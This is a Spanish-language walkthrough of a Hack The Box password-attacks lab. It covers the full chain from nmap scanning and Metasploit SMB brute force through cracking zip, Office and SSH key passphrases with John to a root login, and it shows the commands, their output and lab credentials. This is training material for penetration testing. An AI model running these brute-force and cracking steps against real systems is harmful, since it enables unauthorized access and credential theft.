
# Lab de contraseñas - Medium

Estos tipos de hosts se utilizan a menudo para intercambiar archivos con otros empleados y, por lo general, los administran administradores a través de la red. Durante una reunión con el cliente, se nos informó que muchos usuarios internos utilizan este host como host de salto. La atención se centra en asegurar y proteger los archivos que contienen información confidencial.

***

## <mark style="color:purple;">Objetivo</mark>

> Examina el segundo objetivo y envía el contenido de flag.txt en /root/ como respuesta.

## <mark style="color:purple;">Escaneo de puertos</mark>

```bash
sudo nmap -v -sV -T5 10.129.202.221 -Pn

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Observamos que tiene 3 puertos abiertos, 22, 139 y 445, que se corresponden con SSH y SMB

## <mark style="color:purple;">Bruteforce de SMB</mark>

Vamos a user el módulo `smb_login` de metasploit, explicado en la sección [Bruteforce de Servicios](/ethical-hacking-cheatsheet/explotacion-de-vulnerabilidades/explotacion-en-hosts/password-attacks/bruteforce-de-servicios.md):

```bash
msf6 auxiliary(scanner/smb/smb_login) > set user_file username.list
user_file => username.list
msf6 auxiliary(scanner/smb/smb_login) > set pass_file password.list
pass_file => password.list
msf6 auxiliary(scanner/smb/smb_login) > set rhosts 10.129.187.207
rhosts => 10.129.187.207
msf6 auxiliary(scanner/smb/smb_login) > run

[*] 10.129.187.207:445    - 10.129.187.207:445 - Starting SMB login bruteforce
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\john:123456'
[!] 10.129.187.207:445    - No active DB -- Credential data will not be saved!
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\dennis:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\chris:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\cassie:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\admin:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\root:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\sysadmin:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\sysadm:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\svc:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\administrator:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\helpdesk:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\reception:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\finance:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\its:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\ict:123456'
[+] 10.129.187.207:445    - 10.129.187.207:445 - Success: '.\hr:123456'
```

Observamos que se repiten las mismas credenciales para múltiples usuarios, incluído el usuario `root`: `123456`

## <mark style="color:purple;">Enumeración de SMB</mark>

```bash
crackmapexec smb 10.129.187.207 -u "root" -p "123456" --shares

SMB         10.129.187.207  445    SKILLS-MEDIUM    [*] Windows 6.1 Build 0 (name:SKILLS-MEDIUM) (domain:) (signing:False) (SMBv1:False)
SMB         10.129.187.207  445    SKILLS-MEDIUM    [+] \root:123456 
SMB         10.129.187.207  445    SKILLS-MEDIUM    [+] Enumerated shares
SMB         10.129.187.207  445    SKILLS-MEDIUM    Share           Permissions     Remark
SMB         10.129.187.207  445    SKILLS-MEDIUM    -----           -----------     ------
SMB         10.129.187.207  445    SKILLS-MEDIUM    print$                          Printer Drivers
SMB         10.129.187.207  445    SKILLS-MEDIUM    SHAREDRIVE      READ            SHARE-DRIVE
SMB         10.129.187.207  445    SKILLS-MEDIUM    IPC$                            IPC Service (skills-medium server (Samba, Ubuntu))
```

Encontramos la carpeta compartida `SHAREDRIVE` con permisos de lectura que nos interesa. Dentro vemos que hay un `Docs.zip` que pude contener información relevante, por lo que nos lo vamos a descargar con `smbclient`:

```bash
smbclient -U root \\\\10.129.202.221\\SHAREDRIVE
Password for [WORKGROUP\john]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Feb 10 11:39:38 2022
  ..                                  D        0  Thu Feb 10 11:35:54 2022
  Docs.zip                            N     6724  Thu Feb 10 11:39:38 2022

		14384136 blocks of size 1024. 9908800 blocks available
smb: \> get Docs.zip 
getting file \Docs.zip of size 6724 as Docs.zip (9,9 KiloBytes/sec) (average 9,9 KiloBytes/sec)
smb: \> 
```

Al intentar descomprimir este zip vemos que está protegido por contraseña, por lo que vamos a usar zip2john para crackearlo:

```
unzip Docs.zip 
Archive:  Docs.zip
[Docs.zip] Documentation.docx password:
```

## <mark style="color:purple;">Cracking con zip2john</mark>

```shell-session
afsh4ck@kali$ zip2john Docs.zip > zip.hash
ver 2.0 efh 5455 efh 7875 Docs.zip/Documentation.docx PKZIP Encr: TS_chk, cmplen=6522, decmplen=9216, crc=B1855553 ts=597A cs=597a type=8
```

Vamos a utilizar nuestra lista de contraseñas mutadas con hashcat para aumentar la efectividad del crackeo con John:

```shell-session
afsh4ck@kali$ john --wordlist=mut_password.list zip.hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Destiny2022!     (Docs.zip/Documentation.docx)   
```

Y bumm! Obtenemos la contraseña del zip. Vamos a descomprimirlo y ver su contenido:

```shell-session
afsh4ck@kali$ unzip Docs.zip
Archive:  Docs.zip
[Docs.zip] Documentation.docx password: 
  inflating: Documentation.docx      

afsh4ck@kali$ ls
Docs.zip  Documentation.docx
```

Hay un `Documentation.docx`, pero su contenido está cifrado, por lo que necesitamos desencriptarlo para leer el contenido.

<figure><img src="/files/ndHoLK6U0pfn4GYJiXAH" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Cracking con Office2john</mark>

<pre class="language-shell-session"><code class="lang-shell-session"><strong>afsh4ck@kali$ office2john Documentation.docx > doc.hash
</strong></code></pre>

```shell-session
afsh4ck@kali$ john --wordlist=mut_password.list doc.hash
Using default input encoding: UTF-8
Loaded 1 password hash (Office, 2007/2010/2013 [SHA1 128/128 ASIMD 4x / SHA512 128/128 ASIMD 2x AES])
Cost 1 (MS Office version) is 2007 for all loaded hashes
Cost 2 (iteration count) is 50000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
987654321        (Documentation.docx)
```

Ya tenemos la contraseña del archivo! Ahora necesitamos `libreoffice` para abrirlo en Kali Linux:

```bash
sudo apt install libreoffice
libreoffice Documentation.docx
```

<figure><img src="/files/djOA6ZQPcppI2KVqx2qT" alt=""><figcaption></figcaption></figure>

<figure><img src="/files/VDvkbvvFXlqsvnlzu1oc" alt=""><figcaption></figcaption></figure>

Y obtenemos correctamente las credenciales del usuario root!&#x20;

`jason:C4mNKjAtL2dydsYa6` 🏆

## <mark style="color:purple;">Root Login</mark>

```bash
ssh jason@10.129.187.207    

Last login: Fri Mar 25 13:02:38 2022 from 10.129.202.221
jason@skills-medium:~$  whoami                                                                  jason@skills-medium:~$ whoami
jason
```

Observamos que Jason no es el usuario root (aunque así se recoja en el documento), por lo que vamos a enumerar información dentro del host

```shell-session
jason@skills-medium:/$ cd home
jason@skills-medium:/home$ ls
dennis  jason
```

Lo primero que observamos es que hay 2 usuarios en el sistema: dennis y jason. Enumerando un poco de información encontramos que en el directorio dennis hay un archivo `.bash_history` que posiblemente contenga información relevante sobre el usuario root, pero no podemos acceder:

```shell-session
jason@skills-medium:/home/dennis$ la
.bash_history  .bash_logout  .bashrc  .cache  .config  .profile  .ssh  .viminfo

jason@skills-medium:/home/dennis$ cat .bash_history 
cat: .bash_history: Permission denied
```

## <mark style="color:purple;">Escalada de privilegios</mark>

Observamos que se utiliza una base de datos en el host, por lo que vamos a loguearnos con este usuario administrados para ver si encontramos información relevante:

```shell-session
jason@skills-medium:~$ mysql -u jason -p
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 13
Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)

Copyright (c) 2000, 2022, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

No entry for terminal type "xterm-kitty";
using dumb terminal settings.
Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> 
```

```sql
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| users              |
+--------------------+
2 rows in set (0.01 sec)

mysql> use users;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-----------------+
| Tables_in_users |
+-----------------+
| creds           |
+-----------------+
1 row in set (0.00 sec)

mysql> 
```

```sql
mysql> select * FROM creds;
+-----+--------------------+----------------+
| id  | name               | password       |
+-----+--------------------+----------------+
|   1 | Hiroko Monroe      | YJE25AGN4CX    |
|   2 | Shelley Levy       | GOK34QLM1DT    |
|   3 | Uriel Velez        | OAY05YXS1XN    |
|   4 | Vanna Benton       | EAU86WAY1BY    |
|   5 | Philip Morales     | ONC53GFI2ID    |
<-------SNIP------->
|  96 | Charles Bell       | FAG53RFK7TH    |
|  97 | Justina Greer      | YPG28SUE4JD    |
|  98 | Elton Wallace      | SGH05RBW1YL    |
|  99 | Jamalia Byers      | KVE47IWE5UF    |
| 100 | Lael Rivers        | YNQ63NWP1RD    |
| 101 | dennis             | 7AUgWWQEiMPdqx |
+-----+--------------------+----------------+
101 rows in set (0.00 sec)

mysql> 
```

Encontramos la contraseña del usuario dennis: `7AUgWWQEiMPdqx`

```bash
ssh dennis@10.129.187.207
kex_exchange_identification: read: Connection reset by peer
Connection reset by 10.129.187.207 port 22
```

Al intentar conectarnos por SSH rechaza nuestra conexión, por lo que directamente vamos a cambiar al usuario Dennis dentro del host:

```bash
jason@skills-medium:~$ su dennis
Password: 
dennis@skills-medium:/home/jason$ cd ..
dennis@skills-medium:/home$ cd dennis
dennis@skills-medium:~$ la
.bash_history  .bash_logout  .bashrc  .cache  .config  .profile  .ssh  .viminfo

dennis@skills-medium:~$ cat .bash_history 
ssh-keygen -m PEM -t rsa
ls
cd
cd ..
cd
cd .ssh/
ls
cat id_rsa.pub > authorized_keys
vim authorized_keys 
passwd
clear
exit
cd .ssh
cat id_rsa
dennis@skills-medium:~$ 
```

Conseguimos cambiar al usuario dennis correctamente, y podemos ver el archivo .bash\_history, que tal y como pensábamos nos indica la ruta de los id\_rsa para conectarnos sin contraseña por SSH.

Vamos a transferir el id\_rsa a nuestra máquina de atacante y intentar conectarnos:

```shell-session
afsh4ck@kali$ ls
id_rsa

afsh4ck@kali$ ssh -i id_rsa root@10.129.233.16              
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
Permissions 0644 for 'id_rsa' are too open.
It is required that your private key files are NOT accessible by others.
This private key will be ignored.
Load key "id_rsa": bad permissions
root@10.129.233.16: Permission denied (publickey).

afsh4ck@kali$ chmod 400 id_rsa                             

afsh4ck@kali$ ssh -i id_rsa root@10.129.233.16
Enter passphrase for key 'id_rsa':
```

Nos pide un passphrase para el id\_rsa, por lo que vamos a crackearlo con ssh2john

## <mark style="color:purple;">Cracking con ssh2john</mark>

```shell-session
afsh4ck@kali$ ssh2john id_rsa > ssh.hash 

afsh4ck@kali$ ls
id_rsa  mut_password.list  ssh.hash

afsh4ck@kali$ john --wordlist=mut_password.list ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
P@ssw0rd12020!   (id_rsa)
```

Con esto, obtenemos las credenciales para loguearnos por SSH como el usuario root y el id\_rsa

## <mark style="color:purple;">Acceso Root - Final</mark>

Efectivamente, nos logueamos correctamente y conseguimos acceder a la flag 🏆

```
ssh -i id_rsa root@10.129.233.16
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-99-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon 22 Apr 2024 03:14:46 PM UTC

  System load:  0.0                Processes:               187
  Usage of /:   29.0% of 13.72GB   Users logged in:         1
  Memory usage: 31%                IPv4 address for ens192: 10.129.233.16
  Swap usage:   0%


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Fri Mar 25 15:41:38 2022 from 10.129.202.106
root@skills-medium:~# whoami
root
```

```
root@skills-medium:~# ls
flag.txt  snap

root@skills-medium:~# cat flag.txt 
HTB{PeopleReuse_PWsEverywhere!}
```
